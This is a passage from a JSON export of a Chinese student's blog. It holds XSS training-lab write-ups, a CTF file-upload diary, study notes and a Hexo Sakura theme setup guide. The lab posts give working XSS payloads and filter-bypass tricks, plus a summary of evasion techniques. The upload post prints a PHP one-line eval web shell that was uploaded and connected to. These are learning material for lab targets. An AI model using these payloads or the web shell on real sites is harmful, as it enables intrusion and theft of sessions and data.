的那行字都不会改变，实在是搞不明白，请教了百度，才知道这里要添加一个合法的地址。其他的和level8相同。一种答案：//javascrip&#106;:alert(‘1’)//http://www.baidu.comlevel10：又是新的类型，找不到注入点。仔细查看源码发现了这个：百度得知这是隐藏的表单，要提交到这三个变量中，但前两个都是不行的，只有提交给t_sort才会成功注入。//keyword=1&amp;t_sort= “type=”text” onclick=”alert(1)注：type=”text”是构造一个文本框以来触发onclicklevel11：这关自己搞不定了，主要是没见过不知道怎么下手。可以看到我上一关输入的东西：方法是修改http请求头：就是不知道这怎么看出来是一个注入点的？level12：这一关看到了useragent：那么参考上一关的思路，这一关的注入点就在这里了。修改user-agent：level13：此关根据多出来的变量t-cook以及里面的提示call me maybe？和http头里cookie的代码极其相似，可以判断要修改cookie：level14：又看不懂了……不过好像下面的链接失效了，无法进行测试，先跳过吧。level15：首先分析源码：注：ng-include 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。根据源代码判断，变量src存在注入点。后面都是模仿大佬的操作了。ng-include本地文件包含，调用本地有xss漏洞的文件，触发xss。//src=’level1.php?name=‘level16：根据大佬提示，这一关对script、/、空格进行了转换，并且因为没有文本框要用到type=text。由于空格被替换，这里可以用换行符%0a或者回车符%0d绕过//keyword=&lt;a%0Atype=”text”%0Aonclick=”alert(1)”&gt;level17：查看源码，发现只有embed标签可以利用://arg01=a&amp;arg02= onmouseover=alert()注：这里要用ie浏览器，火狐不支持swf。level18：和上一关一样即可level19和level20因为网上找不到提示并且火狐和ie浏览器好像都没法测试就放弃了。 下面放一些大佬的总结：反射型XSS测试步骤总结：1.检测输入变量，确认每个web页面中用户可自定义的变量，如HTTP参数、POST数据、隐藏表单字段值、预定义的radio值或选择值2.分别确认每个输入变量是否存在xss漏洞。变量输入处输入poc，查看返回的web页面的html中poc代码是否被过滤，浏览器是否响应poc，若存在过滤，进行测试查看能否进行绕过。xss的攻防：1.利用&lt;&gt;标记，构造标签可执行javascript的xss代码。xss过滤函数需过滤&lt;&gt;等字符。2.利用html标签属性支持javascript:伪协议（支持标签属性的有href、lowsrc、bgsound、background、value、action、dynsrc等），执行xss代码。xss 过滤函数需过滤JavaScript等关键字。3.利用javascript在引号中只用分号分隔单词或强制语句结束，用换行符忽略分号强制结束一个完整语句，而忽略回车、空格、tab等键，绕过对javascript的关键字的过滤。4.利用html标签属性值支持ascii码，对标签属性值进行转码进行规则库的绕过。xss 过滤函数需过滤&amp;#\\等字符。5.利用事件处理函数，触发事件，执行xss代码。例如&lt;img src=’#’ onerror=alert(/xss/)&gt;,当浏览器响应页面时，找不到图片的地址，触发onerror事件。6.利用css执行javascript代码css代码中利用expression触发xss漏洞。如下所示：//&lt;div style=”width: expression(alert(‘xss’));&gt;////body {background-image:expression(alert(“xss”));}//css代码中利用@import触发xss////@import ‘javascript:alert(“XSS”)’;//css代码中使用@import和link方式导入外部含有xss代码的样式表文件////&lt;stytle//type=’text/css’&gt;@import url(http://www.*.com/a.css);//xss过滤函数需过滤style标签、style属性、expression、javascript、import等关键字。7.利用大小写混淆、使用单引号、不使用引号、使用/插入在img src中间、构造不同的全角字符、运用/**/混淆过滤规则来绕过过滤函数8.利用字符编码。javascript支持unicode、escapes、十六进制、八进制等编码形式。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"xss-跨站脚本攻击1","slug":"xss-跨站脚本攻击1","date":"2020-02-10T16:41:25.000Z","updated":"2020-02-10T16:42:31.903Z","comments":true,"path":"2020/02/11/xss-跨站脚本攻击1/","link":"","permalink":"/2020/02/11/xss-跨站脚本攻击1/","excerpt":"","text":"xss（Cross Site Scripting），全称跨站脚本攻击。XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。xss靶场记录：level1：点击图片开始挑战。查看回报发现name=什么，就在欢迎用户的后面输出什么，由此可以在name=后面构造：alert(‘xss’)。效果如下：level2：先分析源码，发现在框中输入什么，就会在value=“”&gt;中输出什么，按照第一关的方法输入失败了，查看源码可知需要构造闭合：构造闭合：前面加上”&gt;来完成value=“”&gt;这个语句。后面加上//起注释的作用，这样javascript引擎就会执行alert(1)这句语句。level3：首先查看源码发现和level2差不多，于是首先套用level2的方法尝试，但是&lt;和&gt;被过滤了：尝试构造onclick事件触发xss：注：这个地方还不是很懂，只能先记住了。level4：类型和上面一样，首先尝试”&gt;alert(1)//，但是肯定是不行的，被过滤了。其次尝试构造onclick事件触发xss，成功。level5：首先尝试”&gt;alert(1)//，发现变成了”&gt;&lt;scr_ipt&gt;alert(1)//。其次尝试构造onclick事件，发现变成了” o_nclick=’alert(1)’。利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript:伪协议。“&gt;&lt;a href=’javascript:alert(1)’,没有对javascript进行过滤，触发xss。level6：应该有很多种方法，我找到了两种。一种是最简单的”&gt;alert(1)//，把第一个script的s改为大写即”&gt;alert(1)//。第二种是将上一关中href的h改为大写即可。注：其实还有几种，只是变化不大就不一一列举了。level7：首先尝试了script（即那个最简单的，这里简称script）和onclick，发现script是直接消失，而onclick则是少了on，由此可知应该不能利用大小写来绕过。然后尝试用重复写来绕过，其中scriptscript（这个有点蠢）和ononclick都失败了，接着又试了各种href的，都失败了，各种玄学问题。最后找出来一个：将中间的script扣掉之后两边连起来还是script，我称之为小天才行为。 注：明日开始爆肝学习QAQ","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"1月14日学习（web上传漏洞）","slug":"1月14日学习","date":"2020-01-14T03:24:09.000Z","updated":"2020-01-14T03:55:57.199Z","comments":true,"path":"2020/01/14/1月14日学习/","link":"","permalink":"/2020/01/14/1月14日学习/","excerpt":"","text":"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上午准备下午的比赛，一直在做攻防世界的web，没去看寒假训练题。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;web高手进阶区一道题挺有意思，记录一下。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打开之后让你上传一个文件，随便上传了一个php后缀的，然后提示请上传一个图片，很明显这里要绕过。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有两种方法。第一种是修改源码把onchange=”check();”给删掉。第二种方法就是bp抓包修改把jpg改成php。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是上传了有啥用呢？传成功以后会显示upload success和上传文件的地址。接下来就不知道咋搞了，看了大佬的wp知道要用一句话木马，于是重现创建一个文本文件，写入“&lt;?php @eval($_POST[‘x’]); ?&gt;”，保存为jpg格式然后用方法二上传。这个时候木马文件已经成功上传，接着就是用菜刀连接，shell为我刚刚写入文件的x。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在网上看到还有别的解决方法，但我感觉对php基础要求比较高，就不尝试了。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;希望自己能记住一句话木马这个方法。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"1月13日学习","slug":"1月13日学习","date":"2020-01-13T08:56:44.000Z","updated":"2020-01-13T09:05:22.564Z","comments":true,"path":"2020/01/13/1月13日学习/","link":"","permalink":"/2020/01/13/1月13日学习/","excerpt":"","text":"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天一上午整理宿舍，花了很多时间。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下午把之前做的web题都大致看了一下，感觉还有太多东西不会，不知道从哪开始学。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今日python进度：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;应该不用看完，后面的寒假里稍微了解下就行了。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"1月12日学习","slug":"1月12日学习","date":"2020-01-12T07:09:12.000Z","updated":"2020-01-12T07:51:47.126Z","comments":true,"path":"2020/01/12/1月12日学习/","link":"","permalink":"/2020/01/12/1月12日学习/","excerpt":"","text":"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上午学习python3，菜鸟教程已经看了一半多了，基础的程序已经会写了，但是编程练习有些比较难的还是8太行。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;博客咋搞的忘得差不多了……插个图试试：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下午ctf训练，做了几道简单的密码和杂项，然后开始看web。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Input、管理员的愤怒、flag参数比较简单，主要是想记录一下贪吃蛇和admin123456。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;贪吃蛇：打开发现是一个游戏，玩了一会儿啥反应也没有，死了也没啥反应。然后我用bp看了一下也没什么发现。最后就按f12发现在snake.js里有一串似曾相识的代码（全是表情），百度brainfuck解码，得到了一个flag，但是是错误的。接着随便按按好像打开了报错信息啥的，在这个错误flag的上一行出现了正确的flag，然后提交即可。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;眼睛都快花了，我裂开了。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;admin123456：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这道题不会百度的，一开始看到限制我输入admin（自动转为大写），以为是只要把源码里改一下再输入就行了，但是发现没有那么简单，试了几次都是错的。百度上有说绕过的，我不知道他们是怎么发现的，所以还是老老实实用sqlmap。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大佬们的wp里好像都是直接跳出来的，为啥我是一个一个出来的？而且半小时了还没全部出来，可能是网的问题。玄学。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;先写这么多了，我要回去推车占点了QWQ。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"我在搭建博客时踩的坑及经验总结","slug":"我在搭建博客时踩的坑及经验总结","date":"2019-11-24T06:14:56.000Z","updated":"2019-11-25T04:58:45.809Z","comments":true,"path":"2019/11/24/我在搭建博客时踩的坑及经验总结/","link":"","permalink":"/2019/11/24/我在搭建博客时踩的坑及经验总结/","excerpt":"","text":"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前言：这篇文章是我用了一周几乎所有时间来搭博客的经验总结，仅给那些想搭博客但却老是遇到玄学问题无法解决的萌新们一点帮助。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本周任务是搭建自己的博客，因为我觉得搭一个博客并非难事，所以一开始也没有很重视。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;于是我就百度了各种教程，最终决定了方案——在github上建立，这样可以免去我建立虚拟服务器的麻烦。接着就是按部就班的下载git、nodejs、hexo等等必备的东西。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;环境都准备好了便开始找主题，我先是使用了几款比较热门的主题：butterfly、diaspora等等，在用了三款之后，我发现这种现成的主题很难去自定义，因为网上的教程很少，主题自带的教程也并不丰富，所以不能满足我的需求。然后我找到了自定义空间较大的next主题，官方教程很详细，网上教程也很多。可问题又来了，它留的空间太大了，对于我这样的新手而言，我很难去把他完善成一个丰富多彩的博客。在用了一天半之后我果断地放弃了。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;偶然在网上找到了憨批同款主题Sakura，创作者竟然推出了hexo版（原本只有wordpress能用），立刻加入。本以为直接采用主题可以一劳永逸，搭建完美博客，但实际这只是挑战的开始。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;正文开始&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一、下载sakura主题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此处不太难，官方教程建议下载zip文件，因为直接git clone到theme里会有很多东西要去定义，不适合萌新。（此处我没有看懂，反正下载zip就对了,可以留一份备份，备份非常重要!）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下载了之后解压到博客根目录下就行了 注意是根目录不是主题目录！！！&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二、开始自定义（仅针对hexo-sakura主题）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;开始之前一定要记得填写好上传的地址！！！在博客根目录里那个文件的repo部分！！！&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;自定义有很多方面，我这主要讲更换图片的方法。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先用了别人的主题你标题名字副标题总要改吧？这些都是打字完成的比较简单我就不说了&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;换图片？那还不简单！先换个背景！熟练的按照百度教程把图片放在相应文件夹并填好路径后&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hexo cl hexo g hexo d一气呵成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;刷新看看自己的图！&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不好意思，你博客没了（白屏）。咋回事啊？百度上不是这样说的么？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我来帮你康康！&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;avatar:/images/timg.jpg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;你这不是没加空格么？？？？ 冒号之后一定要加空格才有效 别问 问就是不知道&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;好了，加了空格，重新上传，成功了！我真厉害啊，头像我也要改了。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;再来一遍操作，头像直接没了。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;让我再来帮你康康！&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第九行：cdn: https://cdn.jsdelivr.net/gh/honjun/cdn@1.6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第六行：avatar: /images/timg.jpg&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;萌新可能看不懂这个，这是一个图床，这行代码一般写在主题配置文件前几行。你在接下来的文件中看到的&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;img/xxx/xxx 图片就是存在这个图床里的，所以你无论怎么找在本地也找不到博客上的一些图片。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果！如果你在头像后面填写了本地的地址images/xxx 我这里举个例子 就会这样：图片图床的地址/images/xxx而图床里是没有这个文件夹的，这就造成了无法显示图片的问题。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那咋办嘛！图床啥的直接删了不就得了，我用我自己的呗。不好意思，你博客又没了，直接白屏的那种哦。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于主题自带的很多图片都来自这个图床，你删了这个图床（或者在前面加#号）会造成大量图片无法显示，那这个主题还有何意义呢？(也可能是直接白屏)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以我的建议是，自己搭一个图床，很快的，十分钟就能搞定，教程这里就不给出来了，百度就行：picgo github&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样搜就行了&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;搭好了自己的图床把自己的链接放在cdn: 之后就行了 记得加冒号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还有一个注意点！不要把在图床的图片直接复制粘贴，这样也是无法显示图片的，因为你在上面已经给出了你的图床地址，下面直接写分支（xxx）就行了，可能表达不太清楚，我举个例子：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直接复制粘贴的后果 图片地址为：图床地址/图床地址/xxx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只写分支： 图片地址为： 图床地址/xxx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以清楚的看到两者的区别&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大概这就是Sakura主题图片方面的坑了。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;三、一些小细节及总结&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在进行自定义的过程中你的博客可能会经常白屏无法访问，这个时候千万别急躁，回想一下你上一步的操作，一定是进行了非法的操作。我举个例子：我曾经把主题配置文件的donate部分全部屏蔽掉了（前面加#号），结果造成了所有的文章都无法打开的问题，打开就白屏。我想了很久，最终在重做的时候发现了问题，主题原作者默认在每篇文章下显示“赏”这个部分，移到这个部分会显示作者的二维码，而我却把这些图片都屏蔽掉了，这就导致了玄学问题的产生，文章莫名其妙打不开。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还有很多玄学问题没想起来，想起来再更新吧！QAQ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果你遇到了玄学问题无法解决可以找我，我很乐意帮萌新解决玄学问题，因为我知道花一周时间去解决玄学问题是什么感觉&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;博主的qq：1220101668&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面的二维码我换成自己的了 你们看着办哦QWQ","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]}]}